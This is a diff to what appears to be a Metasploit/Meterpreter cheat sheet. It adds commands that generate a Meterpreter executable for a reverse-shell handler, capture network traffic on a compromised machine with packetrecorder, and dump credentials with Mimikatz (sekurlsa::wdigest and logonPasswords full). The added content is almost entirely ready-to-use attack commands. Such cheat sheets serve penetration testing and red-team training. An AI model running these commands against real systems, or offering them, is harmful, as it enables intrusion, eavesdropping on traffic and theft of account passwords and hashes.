@@ -10,6 +10,7 @@
     * [Meterpreter Webdelivery](#meterpreter-webdelivery)
     * [Get System](#get-system)
     * [Persistence Startup](#persistence-startup)
+    * [Network Monitoring](#network-monitoring)
     * [Portforward](#portforward)
     * [Upload / Download](#upload---download)
     * [Execute from Memory](#execute-from-memory)
@@ -58,7 +59,9 @@ set PAYLOAD generic/shell_reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
 set ExitOnSession false
-exploit -j
+
+generate -o /tmp/meterpreter.exe -f exe
+to_handler
 
 [ctrl+a] + [d]
 ```
@@ -128,6 +131,16 @@ OPTIONS:
 meterpreter > run persistence -U -p 4242
 ```
 
+### Network Monitoring
+
+```powershell
+# list interfaces
+run packetrecorder -li
+
+# record interface n°1
+run packetrecorder -i 1
+```
+
 ### Portforward
 
 ```powershell
@@ -153,7 +166,9 @@ execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
 load mimikatz
 mimikatz_command -f version
 mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::wdigest
 mimikatz_command -f sekurlsa::searchPasswords
+mimikatz_command -f sekurlsa::logonPasswords full
 ```
 
 ```powershell
